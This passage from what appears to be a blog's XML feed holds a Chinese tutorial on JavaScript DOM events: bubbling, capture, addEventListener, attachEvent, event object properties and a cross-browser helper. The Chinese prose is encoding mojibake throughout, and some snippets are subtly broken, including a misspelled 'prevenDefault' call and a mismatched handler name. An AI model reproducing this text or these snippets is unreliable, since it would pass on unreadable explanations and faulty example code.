0;</span></span><br><span class="line"><span class="undefined">    bottom: 0;</span></span><br><span class="line"><span class="undefined">    left: 0;</span></span><br><span class="line"><span class="undefined">    top: 0;</span></span><br><span class="line"><span class="undefined">    -webkit-overflow-scrolling: touch;</span></span><br><span class="line"><span class="undefined">    overflow-y: scroll;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"iframe-outer"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">"width: 100%; height: 100%; border: none; "</span></span></span><br><span class="line"><span class="tag">    <span class="attr">allowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">webkitallowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">mozallowfullscreen</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">src</span>=<span class="string">""</span></span></span><br><span class="line"><span class="tag">  &gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Bug </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>äº‹ä»¶æµä¸äº‹ä»¶å¤„ç†ç¨‹åº</title>
      <link href="/2019/04/22/%E4%BA%8B%E4%BB%B6/"/>
      <url>/2019/04/22/%E4%BA%8B%E4%BB%B6/</url>
      <content type="html"><![CDATA[<blockquote><p>jsä¸HTMLä¹‹é—´çš„äº¤äº’æ˜¯é€šè¿‡äº‹ä»¶å®ç°çš„ã€‚å¯ä»¥ä½¿ç”¨ä¾¦å¬å™¨æ¥é¢„è®¢äº‹ä»¶ï¼Œä»¥ä¾¿äº‹ä»¶å‘ç”Ÿæ—¶æ‰§è¡Œç›¸åº”çš„ä»£ç ï¼Œè¿™ç§æ¨¡å¼è¢«ç§°ä¸ºè§‚å¯Ÿè€…æ¨¡å¼ã€‚</p></blockquote><p><br></p><h3 id="1-äº‹ä»¶æµ"><a href="#1-äº‹ä»¶æµ" class="headerlink" title="1. äº‹ä»¶æµ"></a>1. äº‹ä»¶æµ</h3><p>äº‹ä»¶æµæè¿°çš„æ˜¯ä»é¡µé¢ä¸­æ¥æ”¶äº‹ä»¶çš„é¡ºåºã€‚IEçš„äº‹ä»¶æµæ˜¯äº‹ä»¶å†’æ³¡æµï¼Œè€ŒNetscape Communicatorçš„äº‹ä»¶æµå¤±äº‹ä»¶æ•è·æµã€‚<br><img src="/2019/04/22/äº‹ä»¶/1.png" style="max-width:500px; margin-top:20px"><br><br></p><ul><li><p><em>äº‹ä»¶æ•è·</em><br>ç”±ä¸å¤ªå…·ä½“çš„èŠ‚ç‚¹æ›´æ—©æ¥æ”¶åˆ°äº‹ä»¶ï¼Œè€Œæœ€å…·ä½“çš„èŠ‚ç‚¹æœ€åæ¥æ”¶åˆ°äº‹ä»¶ã€‚äº‹ä»¶æ•è·çš„ç”¨æ„åœ¨äºï¼Œåœ¨äº‹ä»¶åˆ°è¾¾é¢„å®šç›®æ ‡ä¹‹å‰æ•è·å®ƒã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document -&gt; &lt;html&gt; -&gt; &lt;body&gt; -&gt; &lt;div&gt;</span><br></pre></td></tr></table></figure></li><li><p><em>äº‹ä»¶å†’æ³¡</em><br>å³äº‹ä»¶å¼€å§‹æ—¶ç”±æœ€å…·ä½“çš„å…ƒç´ ï¼ˆæ–‡æ¡£ä¸­åµŒå¥—å±‚æ¬¡æœ€æ·±çš„é‚£ä¸ªèŠ‚ç‚¹ï¼‰æ¥æ”¶ï¼Œç„¶åé€çº§å‘ä¸Šä¼ æ’­åˆ°è¾ƒä¸ºä¸å…·ä½“çš„èŠ‚ç‚¹ï¼ˆæ–‡æ¡£ï¼‰ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;  -&gt;  &lt;body&gt;  -&gt; &lt;html&gt; -&gt; document</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h3 id="2-ç»‘å®šäº‹ä»¶"><a href="#2-ç»‘å®šäº‹ä»¶" class="headerlink" title="2. ç»‘å®šäº‹ä»¶"></a>2. ç»‘å®šäº‹ä»¶</h3><h4 id="2-1-lt-div-onclick-quot-quot-gt"><a href="#2-1-lt-div-onclick-quot-quot-gt" class="headerlink" title="2.1 &lt;div onclick=&quot;&quot;&gt;"></a>2.1 <code>&lt;div onclick=&quot;&quot;&gt;</code></h4><p>å…ƒç´ æ”¯æŒçš„æ¯ç§äº‹ä»¶ï¼Œéƒ½å¯ä»¥ä½¿ç”¨ä¸€ä¸ªä¸ç›¸åº”äº‹ä»¶å¤„ç†ç¨‹åºåŒåçš„HTMLç‰¹æ€§æ¥åˆ¶å®šã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"alert('clicked!')"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- onclickæœ‰æƒè®¿é—®å…¨å±€ä½œç”¨åŸŸä¸­çš„ä»»ä½•ä»£ç  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"showMessage()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"try&#123;showMessage();&#125;catch(ex)&#123;&#125;"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>å‡è®¾showMessage()å‡½æ•°æ˜¯åœ¨æŒ‰é’®ä¸‹æ–¹ï¼Œé¡µé¢çš„æœ€åº•éƒ¨å®šä¹‰çš„ã€‚å¦‚æœç”¨æˆ·åœ¨é¡µé¢è§£æ<code>showMessage()</code>ä¹‹å‰å°±å•æœºäº†æŒ‰é’®ï¼Œå°±ä¼šå¼•å‘é”™è¯¯ã€‚ä¸ºæ­¤ï¼Œå¾ˆå¤šHTMLäº‹ä»¶å¤„ç†ç¨‹åºéƒ½ä¼šè¢«è£…åœ¨ä¸€ä¸ªtry-catchå—ä¸­ã€‚<br><br></p><h4 id="2-2-elem-onclick"><a href="#2-2-elem-onclick" class="headerlink" title="2.2 elem.onclick"></a>2.2 elem.onclick</h4><p>DOM0çº§äº‹ä»¶ç»‘å®šï¼Œä½¿ç”¨<code>elem.onclick=function(){}</code>ç»‘å®šäº‹ä»¶ï¼Œè¢«è®¤ä¸ºæ˜¯å…ƒç´ çš„æ–¹æ³•ã€‚è¿™æ—¶å€™ï¼Œäº‹ä»¶å¤„ç†ç¨‹åºæ˜¯åœ¨å…ƒç´ çš„ä½œç”¨åŸŸä¸­è¿›è¡Œã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">'myBtn'</span>);</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.id);   <span class="comment">// 'myBtn'ï¼Œthiså¼•ç”¨å½“å‰å…ƒç´ </span></span><br><span class="line">&#125;</span><br><span class="line">btn.onclick = <span class="literal">null</span>; <span class="comment">// åˆ é™¤äº‹ä»¶å¤„ç†ç¨‹åº</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-addEventListener"><a href="#2-3-addEventListener" class="headerlink" title="2.3 addEventListener"></a>2.3 addEventListener</h4><p>DOM2çº§äº‹ä»¶ç»‘å®š: addEventListener() å’Œ removeEventListener()ã€‚æ¥å—3ä¸ªå‚æ•°ï¼šè¦å¤„ç†çš„äº‹ä»¶åï¼Œäº‹ä»¶å¤„ç†å‡½æ•°ï¼Œå’Œä¸€ä¸ªå¸ƒå°”å€¼(true: åœ¨æ•è·é˜¶æ®µè°ƒç”¨äº‹ä»¶ï¼Œ false: åœ¨å†’æ³¡é˜¶æ®µè°ƒç”¨)ã€‚ä¸ºåŒä¸€ä¸ªå…ƒç´ æ·»åŠ ä¸¤æ¬¡addEventListenerï¼Œä¸¤ä¸ªäº‹ä»¶ä¼šæŒ‰æ·»åŠ é¡ºåºä¾æ¬¡è§¦å‘ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handler = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.id);</span><br><span class="line">&#125;</span><br><span class="line">btn.addEventListener(<span class="string">'click'</span>, handler, <span class="literal">false</span>)</span><br><span class="line">btn.removeEventListener(<span class="string">'click'</span>, handler, <span class="literal">false</span>)</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-attachEvent"><a href="#2-4-attachEvent" class="headerlink" title="2.4 attachEvent"></a>2.4 attachEvent</h4><p>IEå®ç°äº†ä¸¤ä¸ªç±»ä¼¼çš„æ–¹æ³•: attachEvent() å’Œ detachEvent()ã€‚ä¸addEventListenerä¸åŒï¼ŒattachEventï¼Œäº‹ä»¶å¤„ç†ç¨‹åºä¼šåœ¨å…¨å±€ä½œç”¨åŸŸä¸­è¿è¡Œã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span> === <span class="built_in">window</span>);   <span class="comment">// true</span></span><br><span class="line">&#125;</span><br><span class="line">btn.attachEvent(<span class="string">'onclick'</span>, handler);</span><br><span class="line">btn.detachEvent(<span class="string">'onclick'</span>, handler);</span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="3-eventå¯¹è±¡"><a href="#3-eventå¯¹è±¡" class="headerlink" title="3. eventå¯¹è±¡"></a>3. eventå¯¹è±¡</h3><p>åœ¨è§¦å‘domä¸Šçš„æŸä¸ªäº‹ä»¶æ—¶ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªäº‹ä»¶å¯¹è±¡<em><code>event || window.event(IE)</code></em>ï¼Œè¿™ä¸ªå¯¹è±¡ä¸­åŒ…å«ç€æ‰€æœ‰ä¸äº‹ä»¶æœ‰å…³çš„ä¿¡æ¯ã€‚åŒ…å«å¯¼è‡´äº‹ä»¶çš„å…ƒç´ ã€äº‹ä»¶çš„ç±»å‹ä»¥åŠå…¶ä»–ä¸ç‰¹å®šäº‹ä»¶ç›¸å…³çš„ä¿¡æ¯ã€‚å¦‚ï¼Œé¼ æ ‡æ“ä½œå¯¼è‡´çš„äº‹ä»¶ä¸­ï¼Œä¼šåŒ…å«é¼ æ ‡ä½ç½®çš„ä¿¡æ¯ã€‚é”®ç›˜æ“ä½œçš„äº‹ä»¶ä¸­ï¼Œä¼šåŒ…å«ä¸æŒ‰ä¸‹çš„é”®æœ‰å…³çš„ä¿¡æ¯ã€‚</p><table><thead><tr><th>å±æ€§/æ–¹æ³•</th><th style="text-align:center">å€¼</th><th style="text-align:right">è¯´æ˜</th></tr></thead><tbody><tr><td>bubbles</td><td style="text-align:center">Boolean</td><td style="text-align:right">äº‹ä»¶æ˜¯å¦å†’æ³¡</td></tr><tr><td>cancelable</td><td style="text-align:center">Boolean</td><td style="text-align:right">æ˜¯å¦å¯ä»¥å–æ¶ˆäº‹ä»¶çš„é»˜è®¤è¡Œä¸º</td></tr><tr><td>currentTarget</td><td style="text-align:center">Element</td><td style="text-align:right">å½“å‰æ­£åœ¨å¤„ç†äº‹ä»¶çš„é‚£ä¸ªå…ƒç´ </td></tr><tr><td>defaultPrevented</td><td style="text-align:center">Boolean</td><td style="text-align:right">true,è¡¨ç¤ºå·²ç»è°ƒç”¨äº†preventDefautl()</td></tr><tr><td>detail</td><td style="text-align:center">Interger</td><td style="text-align:right">ä¸äº‹ä»¶ç›¸å…³çš„ç»†èŠ‚ä¿¡æ¯</td></tr><tr><td>eventPhase</td><td style="text-align:center">Interger</td><td style="text-align:right">è°ƒç”¨äº‹ä»¶å¤„ç†ç¨‹åºçš„é˜¶æ®µï¼š1-æ•è·é˜¶æ®µï¼Œ2-å¤„äºç›®æ ‡ï¼Œ3-å†’æ³¡é˜¶æ®µ</td></tr><tr><td>preventDefault()</td><td style="text-align:center">Function</td><td style="text-align:right">å–æ¶ˆäº‹ä»¶çš„é»˜è®¤è¡Œä¸º</td></tr><tr><td>stopImmediatePropagation()</td><td style="text-align:center">Function</td><td style="text-align:right">å–æ¶ˆäº‹ä»¶çš„è¿›ä¸€æ­¥æ•è·æˆ–å†’æ³¡ï¼ŒåŒæ—¶é˜»æ­¢ä»»ä½•äº‹ä»¶å¤„ç†ç¨‹åºè¢«è°ƒç”¨</td></tr><tr><td>stopPropagation()</td><td style="text-align:center">Function</td><td style="text-align:right">å–æ¶ˆäº‹ä»¶çš„è¿›ä¸€æ­¥æ•è·æˆ–å†’æ³¡ã€‚å¦‚æœbubblesä¸ºtrueï¼Œåˆ™å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•</td></tr><tr><td>target</td><td style="text-align:center">Element</td><td style="text-align:right">äº‹ä»¶çš„ç›®æ ‡</td></tr><tr><td>trusted</td><td style="text-align:center">Boolean</td><td style="text-align:right">è¡¨æ˜äº‹ä»¶æ˜¯æµè§ˆå™¨ç”Ÿæˆçš„</td></tr><tr><td>type</td><td style="text-align:center">String</td><td style="text-align:right">è¢«è§¦å‘çš„äº‹ä»¶çš„ç±»å‹</td></tr><tr><td>view</td><td style="text-align:center">AbstractView</td><td style="text-align:right">ä¸äº‹ä»¶å…³è”çš„æŠ½è±¡è§†å›¾ã€‚ç­‰åŒäºå‘ç”Ÿäº‹ä»¶çš„windowå¯¹è±¡   </td></tr></tbody></table><p><br></p><h4 id="3-1-currentTarget-target"><a href="#3-1-currentTarget-target" class="headerlink" title="3.1 currentTarget, target"></a>3.1 currentTarget, target</h4><p><code>currentTarget</code>å§‹ç»ˆç­‰äºå¯¹è±¡thisçš„å€¼ï¼Œ<code>target</code>åˆ™åªåŒ…å«äº‹ä»¶çš„å®é™…ç›®æ ‡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(event.currentTarget === <span class="built_in">document</span>.body);   <span class="comment">// true</span></span><br><span class="line">  alert(<span class="keyword">this</span> === <span class="built_in">document</span>.body);                  <span class="comment">// true</span></span><br><span class="line">  alert(event.target === <span class="built_in">document</span>.getElementById(<span class="string">"myBtn"</span>))  <span class="comment">// true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-event-type"><a href="#3-2-event-type" class="headerlink" title="3.2 event.type"></a>3.2 event.type</h4><p>åœ¨éœ€è¦é€šè¿‡ä¸€ä¸ªå‡½æ•°å¤„ç†å¤šä¸ªäº‹ä»¶æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<em><code>type</code></em>å±æ€§ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> handler = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">switch</span>(event.type)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">"click"</span>:</span><br><span class="line">      alert(<span class="string">"clicked"</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"mouseover"</span>:</span><br><span class="line">      event.target.style.backgroundColor = <span class="string">"red"</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">"mouseout"</span>:</span><br><span class="line">      event.target.style.backgroundColor = <span class="string">""</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">btn.onclick = handler;</span><br><span class="line">btn.onmouseover = handler;</span><br><span class="line">btn.onmouseout = handler;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-3-event-preventDefault"><a href="#3-3-event-preventDefault" class="headerlink" title="3.3 event.preventDefault()"></a>3.3 event.preventDefault()</h4><p>é˜»æ­¢ç‰¹å®šäº‹ä»¶çš„é»˜è®¤è¡Œä¸ºï¼Œä¾‹å¦‚<code>&lt;a&gt;</code>è¢«å•å‡»æ—¶ä¼šå¯¼èˆªåˆ°å…¶hrefç‰¹æ€§æŒ‡å®šçš„URLã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å–æ¶ˆäº†é“¾æ¥å¯¼èˆªè¿™ä¸€é»˜è®¤è¡Œä¸º</span></span><br><span class="line">link.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  event.prevenDefault();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-4-stopPropagation"><a href="#3-4-stopPropagation" class="headerlink" title="3.4 stopPropagation()"></a>3.4 stopPropagation()</h4><p>ç«‹å³åœæ­¢äº‹ä»¶åœ¨DOMå±‚æ¬¡ä¸­çš„ä¼ æ’­ï¼Œå–æ¶ˆè¿›ä¸€æ­¥çš„äº‹ä»¶æ•è·æˆ–å†’æ³¡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åœ¨æŒ‰é’®ä¸Šè°ƒç”¨stopPropagation()ï¼Œä»è€Œé¿å…è§¦å‘æ³¨å†Œåœ¨document.bodyä¸Šé¢çš„äº‹ä»¶</span></span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"Clicked"</span>);</span><br><span class="line">  event.stopPropagation();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"Body clicked"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-5-IEä¸­çš„event"><a href="#3-5-IEä¸­çš„event" class="headerlink" title="3.5 IEä¸­çš„event"></a>3.5 IEä¸­çš„event</h4><table><thead><tr><th>å±æ€§/æ–¹æ³•</th><th style="text-align:center">å€¼</th><th style="text-align:right">è¯´æ˜</th></tr></thead><tbody><tr><td>cancelBubble</td><td style="text-align:center">Boolean</td><td style="text-align:right">é»˜è®¤ä¸ºfalse,è®¾ç½®ä¸ºtrueå¯ä»¥å–æ¶ˆäº‹ä»¶å†’æ³¡</td></tr><tr><td>returnValue</td><td style="text-align:center">Boolean</td><td style="text-align:right">é»˜è®¤ä¸ºtrue,è®¾ç½®ä¸ºfalseå¯ä»¥å–æ¶ˆäº‹ä»¶çš„é»˜è®¤è¡Œä¸º</td></tr><tr><td>srcElement</td><td style="text-align:center">Element</td><td style="text-align:right">äº‹ä»¶çš„ç›®æ ‡(ä¸DOMçš„targetå±æ€§ç›¸åŒ)</td></tr><tr><td>type</td><td style="text-align:center">String</td><td style="text-align:right">äº‹ä»¶çš„ç±»å‹</td></tr></tbody></table><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// functionçš„ä½œç”¨åŸŸæ˜¯æ ¹æ®æŒ‡å®šå®ƒçš„æ–¹å¼æ¥ç¡®å®šçš„ï¼Œä¸èƒ½è®¤ä¸ºthiså§‹ç»ˆç­‰äºäº‹ä»¶ç›®æ ‡ã€‚ç”¨event.srcElementæ¯”è¾ƒä¿é™©</span></span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="built_in">window</span>.event.srcElement === <span class="keyword">this</span>);  <span class="comment">// true</span></span><br><span class="line">&#125;</span><br><span class="line">btn.attachEvent(<span class="string">"onclick"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  alert(event.srcElement === <span class="keyword">this</span>);  <span class="comment">// false</span></span><br><span class="line">  <span class="built_in">window</span>.event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-6-event-clientX-pageX-screenX"><a href="#3-6-event-clientX-pageX-screenX" class="headerlink" title="3.6 event.clientX, pageX,screenX"></a>3.6 event.clientX, pageX,screenX</h4><p>å¾—çŸ¥äº‹ä»¶å‘ç”Ÿçš„åæ ‡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// æµè§ˆå™¨è§†å£ä¸­çš„ç‰¹å®šä½ç½®ä¸Šå‘ç”Ÿ</span></span><br><span class="line">  alert(<span class="string">'Client coordinates:'</span> + event.clientX + event.clientY);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// åœ¨é¡µé¢ä¸­çš„ä½ç½®,é¡µé¢æ²¡æœ‰æ»šåŠ¨çš„æƒ…å†µä¸‹,pageXå’ŒclientXç›¸ç­‰</span></span><br><span class="line">  alert(<span class="string">'Page coordinates:'</span> + event.pageX + event.pageY);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ç›¸å¯¹äºæ•´ä¸ªç”µè„‘å±å¹•çš„ä½ç½®</span></span><br><span class="line">  alert(<span class="string">'Screen coordinates:'</span> + event.screenX + event.screenY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-7-ä¿®æ”¹é”®"><a href="#3-7-ä¿®æ”¹é”®" class="headerlink" title="3.7 ä¿®æ”¹é”®"></a>3.7 ä¿®æ”¹é”®</h4><p>åœ¨æŒ‰ä¸‹é¼ æ ‡é”®ç›˜ä¸Šçš„æŸäº›é”®çš„çŠ¶æ€ä¹Ÿå¯ä»¥å½±å“åˆ°æ‰€è¦é‡‡å–çš„æ“ä½œã€‚è¿™äº›ä¿®æ”¹é”®æ˜¯shift, ctrl, altå’Œmeta(windowsé‡Œæ˜¯windowsé”®ï¼Œè‹¹æœæ¢¨æ˜¯cmdé”®)ã€‚DOMå®šä¹‰äº†4ä¸ªå±æ€§ï¼Œæ¥è¡¨ç¤ºè¿™äº›ä¿®æ”¹é”®çš„çŠ¶æ€: shiftKey, ctrlKey, altKey, metaKey(Booleanå€¼)<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (event.shiftKey)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-è·¨æµè§ˆå™¨ç»‘å®šäº‹ä»¶"><a href="#4-è·¨æµè§ˆå™¨ç»‘å®šäº‹ä»¶" class="headerlink" title="4. è·¨æµè§ˆå™¨ç»‘å®šäº‹ä»¶"></a>4. è·¨æµè§ˆå™¨ç»‘å®šäº‹ä»¶</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> EventUtil = &#123;</span><br><span class="line">  addHandler: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.addEventListener) &#123;</span><br><span class="line">      element.addEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</span><br><span class="line">      element.attachEvent(<span class="string">"on"</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">"on"</span> + type] = handler;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  removeHandler: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.removeEventListener) &#123;</span><br><span class="line">      element.removeEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.detachEvent) &#123;</span><br><span class="line">      element.detachEvent(<span class="string">"on"</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">"on"</span> + type] = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  getEvent: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event ? event : <span class="built_in">window</span>.event;</span><br><span class="line">  &#125;,</span><br><span class="line">  getTarget: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event.target || event.srcElement;</span><br><span class="line">  &#125;,</span><br><span class="line">  preventDefault: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.preventDefault)&#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.returnValue = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  stopPropagation: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.stopPropagation)&#123;</span><br><span class="line">      event.stopPropagation();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br><br><br></p><h3 id="5-äº‹ä»¶ç±»å‹"><a href="#5-äº‹ä»¶ç±»å‹" class="headerlink" title="5. äº‹ä»¶ç±»å‹"></a>5. äº‹ä»¶ç±»å‹</h3><h4 id="5-1-load"><a href="#5-1-load" class="headerlink" title="5.1 load"></a>5.1 load</h4><p><code>window.load</code>å½“é¡µé¢å®Œå…¨åŠ 